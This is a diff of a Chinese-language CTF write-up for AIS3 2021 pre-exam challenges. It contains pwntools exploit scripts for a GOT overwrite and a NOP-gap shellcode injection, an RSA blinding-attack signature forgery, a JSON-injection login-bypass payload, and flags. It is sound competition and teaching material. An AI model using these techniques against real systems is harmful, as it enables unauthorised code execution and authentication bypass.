-                                    <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x1e21d9</span>[<span style="color:#e6db74">&#39;innerHTML&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#75715e">// unlock input
-</span><span style="color:#75715e"></span>                                    document[<span style="color:#e6db74">&#39;getElementById&#39;</span>](<span style="color:#e6db74">&#39;output&#39;</span>)[<span style="color:#e6db74">&#39;innerHTML&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">atob</span>(<span style="color:#a6e22e">b2</span>)[<span style="color:#e6db74">&#39;match&#39;</span>](<span style="color:#e6db74">/(.{1,3})/g</span>)[<span style="color:#e6db74">&#39;map&#39;</span>](<span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x5efa9e</span>=&gt;<span style="color:#a6e22e">TAG</span>(<span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x5efa9e</span>[<span style="color:#ae81ff">0x0</span>], <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x5efa9e</span>[<span style="color:#ae81ff">0x1</span>], <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x5efa9e</span>[<span style="color:#ae81ff">0x2</span>]))[<span style="color:#e6db74">&#39;join&#39;</span>](<span style="color:#e6db74">&#39;&#39;</span>),
-                                    <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x1</span>;
-                                <span style="color:#66d9ef">else</span> {
-                                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>][<span style="color:#e6db74">&#39;length&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x1</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xa</span>)
-                                        <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x1e21d9</span>[<span style="color:#e6db74">&#39;textContent&#39;</span>] <span style="color:#f92672">+=</span> String[<span style="color:#e6db74">&#39;fromCharCode&#39;</span>](<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>][<span style="color:#e6db74">&#39;charCodeAt&#39;</span>]());
-                                    <span style="color:#66d9ef">else</span>
-                                        <span style="color:#66d9ef">return</span>;
-                                }
+                                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>][<span style="color:#e6db74">&#39;length&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x1</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xa</span>)
+                                    <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x1e21d9</span>[<span style="color:#e6db74">&#39;textContent&#39;</span>] <span style="color:#f92672">+=</span> String[<span style="color:#e6db74">&#39;fromCharCode&#39;</span>](<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>][<span style="color:#e6db74">&#39;charCodeAt&#39;</span>]());
+                                <span style="color:#66d9ef">else</span>
+                                    <span style="color:#66d9ef">return</span>;
                             }
                         }
                     }
                 }
             }
         }
-        <span style="color:#a6e22e">update</span>(<span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x1e21d9</span>[<span style="color:#e6db74">&#39;textContent&#39;</span>]);
     }
+    <span style="color:#a6e22e">update</span>(<span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x1e21d9</span>[<span style="color:#e6db74">&#39;textContent&#39;</span>]);
+}
 </code></pre></div><p>基本上就是從EventListener抓你輸入的十個key</p>
 <p>可以看出secret code是 <strong>↑↑↓↓←←→→ba</strong></p>
 <p>輸入secret code後還不放過你：</p>
 <figure><img src="/img/ais3_2021/pre_exam/colors02.png"/>
 </figure>
 
-<p>接下來我們可以輸入任意字串，然後給我們看encode後的結果</p>
+<p>接下來我們可以輸入任意字串，網站會給我們看encode後的結果</p>
 <p>寫出decoder後應該就能還原flag了</p>
 <p>先來看看他的encoding邏輯：</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">TAG</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">cid</span>,<span style="color:#a6e22e">rid</span>,<span style="color:#a6e22e">chr</span>)=&gt;<span style="color:#e6db74">&#39;&lt;span&gt;&lt;div\x20class=\x22c&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">cid</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\x20r&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">rid</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\x22&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">chr</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&lt;/div&gt;&lt;/span&gt;&#39;</span>;
-<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">b3</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f2</span>(<span style="color:#ae81ff">0x1d4</span>);
-<span style="color:#75715e">// atob(b3) === &#34;AlS3{BasE64_i5+b0rNIng~\\Qwo/-xH8WzCj7vFD2eyVktqOL1GhKYufmZdJpX9}&#34; // 64
-</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">b64</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AlS3{BasE64_i5+b0rNIng~\\Qwo/-xH8WzCj7vFD2eyVktqOL1GhKYufmZdJpX9}&#34;</span>;
+
 <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">encode</span>(<span style="color:#a6e22e">INPUT</span>) {
     <span style="color:#66d9ef">const</span> <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x9fe181</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f2</span>;
     <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">INPUT</span>[<span style="color:#e6db74">&#39;length&#39;</span>])
@@ -364,7 +449,7 @@ python -m pickletools -a flag_checker.pkl
 		<span style="color:#75715e">// bit 6 to 8 bit determines color
 </span><span style="color:#75715e"></span>		<span style="color:#75715e">// bit 9 determines ???
 </span><span style="color:#75715e"></span>		<span style="color:#75715e">// bit 0 to 5 determines char
-</span><span style="color:#75715e"></span>        <span style="color:#a6e22e">result</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">TAG</span>(<span style="color:#a6e22e">x</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x6</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7</span>, <span style="color:#a6e22e">x</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x9</span>, <span style="color:#a6e22e">atob</span>(<span style="color:#a6e22e">b3</span>)[<span style="color:#a6e22e">x</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x3f</span>]);
+</span><span style="color:#75715e"></span>        <span style="color:#a6e22e">result</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">TAG</span>(<span style="color:#a6e22e">x</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x6</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7</span>, <span style="color:#a6e22e">x</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x9</span>, <span style="color:#a6e22e">b64</span>[<span style="color:#a6e22e">x</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x3f</span>]);
     }
     <span style="color:#66d9ef">for</span> (; <span style="color:#a6e22e">rest</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#a6e22e">rest</span><span style="color:#f92672">--</span>) {
         <span style="color:#a6e22e">result</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">TAG</span>(<span style="color:#a6e22e">rest</span> <span style="color:#f92672">%</span> <span style="color:#a6e22e">eight</span>, <span style="color:#ae81ff">0x0</span>, <span style="color:#e6db74">&#39;=&#39;</span>);
@@ -428,10 +513,58 @@ python -m pickletools -a flag_checker.pkl
     <i class="fa fa-link" aria-hidden="true"></i>
   </a>
 </h2>
-<p>話說GOT Hijacking不是應該會和ROP一起出成某個模板題嗎？</p>
-<p>像這題這麼直白的問法我還是第一次看到</p>
-<p>flag 放在home/gotplt/flag</p>
+<p>題目有給Source</p>
+<p>基本上就是讓你寫8-byte到任意地方</p>
+<p>只是因為<code>system@got</code>被寫0，最後的<code>system(&quot;/bin/sh&quot;);</code>跑不出來</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+{
+    setvbuf(stdin, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
+    setvbuf(stdout, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
+    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>systemgot <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404028</span>;
+    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>scanfgot <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404040</span>;
+    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)systemgot <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>)<span style="color:#ae81ff">0x0</span>;
+
+    printf(<span style="color:#e6db74">&#34;Address: &#34;</span>);
+    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>addr;
+    <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> v;
+    scanf(<span style="color:#e6db74">&#34;%ld&#34;</span>,<span style="color:#f92672">&amp;</span>addr);
+    printf(<span style="color:#e6db74">&#34;Value: &#34;</span>);
+    scanf(<span style="color:#e6db74">&#34;%ld&#34;</span>,<span style="color:#f92672">&amp;</span>v);
+    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)addr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>)v;
+
+    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)scanfgot <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>)<span style="color:#ae81ff">0x0</span>;
+    printf(<span style="color:#e6db74">&#34;OK! Shell for you :)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    system(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>binary的名字叫做gotplt</p>
+<p>checksec 的結果是Partial Relocation + No PIE</p>
+<p>也就是這個ELF裡面的offset在每次執行都一樣，而且GOT table可寫</p>
+<p>所以把<code>system@got</code>的位址還原就可以順利跑<code>system(&quot;/bin/sh&quot;)</code>了</p>
+<p>因為是用<code>scanf(&quot;%ld&quot;)</code>，所以要記得把位址轉十進位再輸入</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;info&#39;</span>
+binary <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./gotplt&#39;</span>)
+
+<span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
+    p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;quiz.ais3.org&#39;</span>, <span style="color:#ae81ff">10102</span>)
+<span style="color:#66d9ef">else</span>:
+    p <span style="color:#f92672">=</span> process(binary<span style="color:#f92672">.</span>path)
+
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Address: &#39;</span>)
+p<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">4210728</span>))
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Value: &#39;</span>)
+p<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">4198480</span>))
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>flag 放在home/gotplt/flag</p>
 <p><code>AIS3{Y0u_know_h0w_1@2y_b1nd1ng_w@rking}</code></p>
+<p>話說GOT Hijacking不是應該會和ROP一起出成某個模板題嗎？</p>
+<p>這題的考法也太直白&hellip;就算不知道lazy binding好像也能瞎猜出來？</p>
 <hr>
 <h2 id="noper">
   Noper
@@ -439,11 +572,15 @@ python -m pickletools -a flag_checker.pkl
     <i class="fa fa-link" aria-hidden="true"></i>
   </a>
 </h2>
-<p>一開始</p>
+<p>題目沒給Source</p>
+<p>它會讀64-byte 進去然後當做 opcode 去執行</p>
+<p>只是在執行前會用<code>rand()</code>選出一些byte然後寫入0x90 (x86-64指令集的NOP指令)</p>
+<p>因為是從64-byte當中選出9個，一開始以為多傳幾次就好了</p>
 <p>看了老半天才發現他根本沒做過srand(time(NULL))</p>
 <p>這種時候相當於用srand(1)初始化</p>
 <p>所以本機和伺服器上每次執行時填NOP的位置都一樣</p>
 <p>接下來就是把payload裡的opcode分段塞進不會被填NOP的縫隙裡</p>
+<p>我塞的shellcode是<a href="http://shell-storm.org/shellcode/files/shellcode-603.php">這個</a></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
@@ -470,6 +607,7 @@ p<span style="color:#f92672">.</span>sendline(payload)
 p<span style="color:#f92672">.</span>interactive()
 </code></pre></div><p>flag 放在 home/noper/flag</p>
 <p><code>AIS3{nOp_noOp_NOoop!!!}</code></p>
+<p>蠻有趣的塞shellcode題</p>
 <p>這一題是首殺、豪爽</p>
 <hr>
 <h1 id="crypto">
@@ -484,6 +622,9 @@ p<span style="color:#f92672">.</span>interactive()
     <i class="fa fa-link" aria-hidden="true"></i>
   </a>
 </h2>
+<p>題目Source是C++，只是用macro和template之類的東東</p>
+<p>把語法弄得很像Python，這也太變態了吧</p>
+<p>幸好加密邏輯很單純</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;python.h&#34;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span>
@@ -530,16 +671,17 @@ def <span style="color:#a6e22e">main</span>() <span style="color:#f92672">-&gt;<
 	<span style="color:#75715e">//     result is: =Js&amp;;*A`odZHi&#39;&gt;D=Js&amp;#i-DYf&gt;Uy&#39;yuyfyu&lt;)Gu
 </span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>                                                                    ;}
 
-</code></pre></div><p>這也太變態了吧</p>
-<p>幸好</p>
-<p>把key bruteforce出來再拿去decrypt就好了</p>
+</code></pre></div><p>一個Block是四個字元，Key 被重複使用</p>
+<p>因為加密過程只用到mod 96底下的加減法，解密過程很容易寫出來</p>
+<p>然後我們大概可以猜到明文的前四個字元會是AIS3</p>
+<p>所以把Key爆搜出來再拿去解密就好了</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
 cipher <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;=Js&amp;;*A`odZHi&#39;&gt;D=Js&amp;#i-DYf&gt;Uy&#39;yuyfyu&lt;)Gu&#34;</span>
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">brutekeys</span>(p, c):
     keys <span style="color:#f92672">=</span> []
     <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
-        <span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">95</span>):
+        <span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">96</span>):
             <span style="color:#66d9ef">if</span> ((ord(p[i])<span style="color:#f92672">-</span><span style="color:#ae81ff">32</span>) <span style="color:#f92672">+</span> key) <span style="color:#f92672">%</span> <span style="color:#ae81ff">96</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">==</span> ord(c[<span style="color:#ae81ff">3</span><span style="color:#f92672">-</span>i]):
                 keys<span style="color:#f92672">.</span>append(key)
     <span style="color:#66d9ef">return</span> keys
@@ -587,39 +729,34 @@ flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;
 		<span style="color:#66d9ef">else</span>:
 			self<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Well done!&#39;</span>)
 </code></pre></div><p>官方還很好心在TODO那個地方放一個提示</p>
+<p>數位簽證應該要簽明文的Hash而不是明文本身</p>
+<p>再加上我們有一定程度的Blind Signing</p>
+<p>可以用<a href="https://masterpessimistaa.wordpress.com/2017/07/10/blinding-attack-on-rsa-digital-signatures/">Blinding Attack</a>偽造簽證</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> bytes_to_long, inverse
 
 context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;info&#39;</span>
 
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">inverse_mod</span>(a, m):
-    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, m):
-        <span style="color:#66d9ef">if</span> (((a<span style="color:#f92672">%</span>m) <span style="color:#f92672">*</span> (x<span style="color:#f92672">%</span>m)) <span style="color:#f92672">%</span> m <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>):
-            <span style="color:#66d9ef">return</span> x
-    <span style="color:#66d9ef">assert</span>(False)
-
 p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;quiz.ais3.org&#39;</span>, <span style="color:#ae81ff">42069</span>)
 p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;n = &#39;</span>)
 n <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline())
 e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
-log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;n = &#39;</span> <span style="color:#f92672">+</span> hex(n))
 p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;3) exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
 
 r <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span> <span style="color:#75715e"># blinding factor, can be anything</span>
 m <span style="color:#f92672">=</span> bytes_to_long(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Ethan Winters&#39;</span>)
 M <span style="color:#f92672">=</span> (pow(r, e, n) <span style="color:#f92672">*</span> m ) <span style="color:#f92672">%</span> n    <span style="color:#75715e"># M === (r^e) * m mod n</span>
-p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;1&#39;</span>) <span style="color:#75715e"># sign M</span>
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;1&#39;</span>)                <span style="color:#75715e"># sign M</span>
 p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;(in hex): &#39;</span>)
 p<span style="color:#f92672">.</span>sendline(hex(M)[<span style="color:#ae81ff">2</span>:])
 p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Signature: &#39;</span>)
 S <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline())          <span style="color:#75715e"># S === M^d mod n</span>
 
-s <span style="color:#f92672">=</span> (S <span style="color:#f92672">*</span> inverse(r, n)) <span style="color:#f92672">%</span> n
-log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;s = &#39;</span> <span style="color:#f92672">+</span> hex(s))
+s <span style="color:#f92672">=</span> (S <span style="color:#f92672">*</span> inverse(r, n)) <span style="color:#f92672">%</span> n    <span style="color:#75715e"># s is the fake signature we want</span>
 p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;3) exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
 
-p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;2&#39;</span>) <span style="color:#75715e"># verify with s</span>
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;2&#39;</span>)                <span style="color:#75715e"># verify with s</span>
 p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Signature: &#39;</span>)
 p<span style="color:#f92672">.</span>sendline(str(s))
 p<span style="color:#f92672">.</span>interactive()
@@ -637,6 +774,7 @@ p<span style="color:#f92672">.</span>interactive()
     <i class="fa fa-link" aria-hidden="true"></i>
   </a>
 </h2>
+<p>題目有給Source，是後端用Flask寫的登入頁面：</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, make_response, redirect, session, render_template, send_file
 <span style="color:#f92672">import</span> os
 <span style="color:#f92672">import</span> json
@@ -649,7 +787,6 @@ users_db <span style="color:#f92672">=</span> {
     <span style="color:#e6db74">&#39;guest&#39;</span>: <span style="color:#e6db74">&#39;guest&#39;</span>,
     <span style="color:#e6db74">&#39;admin&#39;</span>: os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;S3CR3T_P455W0RD&#39;</span>)
 }
-
 
 <span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>)
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
@@ -676,22 +813,10 @@ users_db <span style="color:#f92672">=</span> {
     )
     session[<span style="color:#e6db74">&#39;user_data&#39;</span>] <span style="color:#f92672">=</span> data
     <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/&#34;</span>)
-
-
-<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/logout&#34;</span>)
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">logout</span>():
-    session<span style="color:#f92672">.</span>clear()
-    <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/&#34;</span>)
-
-
-<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/sauce&#34;</span>)
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sauce</span>():
-    <span style="color:#66d9ef">return</span> send_file(__file__, mimetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/plain&#34;</span>)
-
-
-<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
-    app<span style="color:#f92672">.</span>run(threaded<span style="color:#f92672">=</span>True, debug<span style="color:#f92672">=</span>True)
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> json
+</code></pre></div><p>在login()可以看到POST Request裡面的username和password直接被塞進一個JSON物件，然後在index()裡面進行驗證，我們需要通過<code>valid_user(user)</code>以及<code>user['showflag'] == True and user['username'] != 'guest'</code> 這兩個test。</p>
+<p>接下來就是嘗試各種 username 和 password 組合</p>
+<p>主要想法是在data裡面注入重複的key來覆寫原本的value</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> json
 <span style="color:#f92672">import</span> os
 
 users_db <span style="color:#f92672">=</span> {
@@ -699,7 +824,7 @@ users_db <span style="color:#f92672">=</span> {
     <span style="color:#e6db74">&#39;admin&#39;</span>: os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;S3CR3T_P455W0RD&#39;</span>)
 }
 
-username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;sloth&#34;, &#34;showflag&#34;: true, &#34;foo&#34;:&#34;&#39;</span>
+username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;x2w&#34;, &#34;showflag&#34;: true, &#34;foo&#34;:&#34;&#39;</span>
 password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#34;, &#34;password&#34;: null, &#34;foo&#34;:&#34;&#39;</span>
 
 data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{&#34;showflag&#34;: false, &#34;username&#34;: &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;, &#34;password&#34;: &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;}&#39;</span> <span style="color:#f92672">%</span> (
@@ -710,7 +835,11 @@ user <span style="color:#f92672">=</span> json<span style="color:#f92672">.</spa
 <span style="color:#66d9ef">if</span> users_db<span style="color:#f92672">.</span>get(user[<span style="color:#e6db74">&#39;username&#39;</span>]) <span style="color:#f92672">==</span> user[<span style="color:#e6db74">&#39;password&#39;</span>]:
     <span style="color:#66d9ef">if</span> user[<span style="color:#e6db74">&#39;showflag&#39;</span>] <span style="color:#f92672">==</span> True <span style="color:#f92672">and</span> user[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;guest&#39;</span>:
         <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;SUCCESS&#34;</span>) <span style="color:#75715e"># bypass checks</span>
-</code></pre></div><p><code>AIS3{/r/badUIbattles?!?!}</code></p>
+</code></pre></div><p>這樣子的user物件會是</p>
+<p><code>{'showflag': True, 'username': 'x2w', 'foo': '', 'password': None}</code></p>
+<p>在第一個test的結果是<code>None == None</code>，這在Python裡面是True</p>
+<p>第二個test也會通過，showflag 和 username 都被覆寫過了</p>
+<p>拿到Flag <code>AIS3{/r/badUIbattles?!?!}</code></p>
 <hr>
 <h1 id="misc">
   MISC
@@ -724,12 +853,28 @@ user <span style="color:#f92672">=</span> json<span style="color:#f92672">.</spa
     <i class="fa fa-link" aria-hidden="true"></i>
   </a>
 </h2>
-<p><figure><img src="/img/ais3_2021/pre_exam/microcheese01.png"/>
+<p>這題原本是Crypto的某題，因為邏輯寫爛了有莫名其妙的解法而被歸類到Misc來。</p>
+<p>連到server讓你和電腦玩<a href="https://en.wikipedia.org/wiki/Nim">Nim Game</a>，</p>
+<p>可以除存遊戲並且再載入。(以Hash的形式)</p>
+<p>贏了就給Flag，當然生成的每一局都是電腦必贏。</p>
+<figure><img src="/img/ais3_2021/pre_exam/microcheese01.png"/>
 </figure>
 
+<p>原本在遊戲裡應該只有三種操作：</p>
+<ol start="0">
+<li>make a move</li>
+<li>save the current game and leave</li>
+<li>resign the game</li>
+</ol>
+<p>但是因為最後一個判斷停在<code>elif</code>而不是<code>else</code>，我們可以輸入3, 4, 5&hellip;之類的</p>
+<p>可以繼續下棋還不會crash</p>
 <figure><img src="/img/ais3_2021/pre_exam/microcheese02.png"/>
 </figure>
-</p>
+
+<p>搞到最後變成是一局我們可以贏的Nim Game&hellip;</p>
+<p><code>AIS3{5._e3_b5_6._a4_Bb4_7._Bd2_a5_8._axb5_Bxc3}</code></p>
+<p>原本的題目好像是要找Hash的漏洞然後讓它載入一局我們必贏的Nim Game?</p>
+<p>可惜我太菜不懂Hash</p>
 <hr>
 <h2 id="blind">
   Blind
@@ -737,6 +882,7 @@ user <span style="color:#f92672">=</span> json<span style="color:#f92672">.</spa
     <i class="fa fa-link" aria-hidden="true"></i>
   </a>
 </h2>
+<p>題目Source:</p>
